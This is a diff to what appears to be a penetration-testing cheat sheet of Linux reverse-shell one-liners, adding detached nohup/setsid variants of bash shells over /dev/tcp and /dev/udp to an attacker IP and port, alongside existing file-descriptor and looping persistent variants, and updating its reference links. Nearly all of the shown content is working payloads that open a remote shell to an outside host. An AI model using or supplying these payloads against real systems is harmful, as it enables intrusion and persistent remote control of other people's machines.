@@ -16,6 +16,8 @@ Target
 ```
 $ /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1
 
+$ nohup setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1'
+
 $ nohup 0<&103-;exec 103<>/dev/tcp/<attacker_IP>/<attacker_PORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
 ```
 
@@ -31,6 +33,8 @@ Target
 
 ```
 $ /bin/bash -i >& /dev/udp/<attacker_IP>/<attacker_PORT> 0>&1
+
+$ nohup setsid /bin/bash -c '/bin/bash -i >& /dev/udp/<attacker_IP>/<attacker_PORT> 0>&1'
 
 $ nohup 0<&103-;exec 103<>/dev/udp/<attacker_IP>/<attacker_PORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
 ```
@@ -76,14 +80,10 @@ $ while true; do /bin/bash -i >& /dev/<protocol>/<IP>/<LPORT> 0>&1; sleep 10;
 ---
 ## References
 
-### Hacktricks
-
-- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
-
 ### Github
 
 - [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
 
-### MITRE
+### Hacktricks
 
-- [MITRE T1059.004: Command and Scripting Interpreter - Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
+- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html)
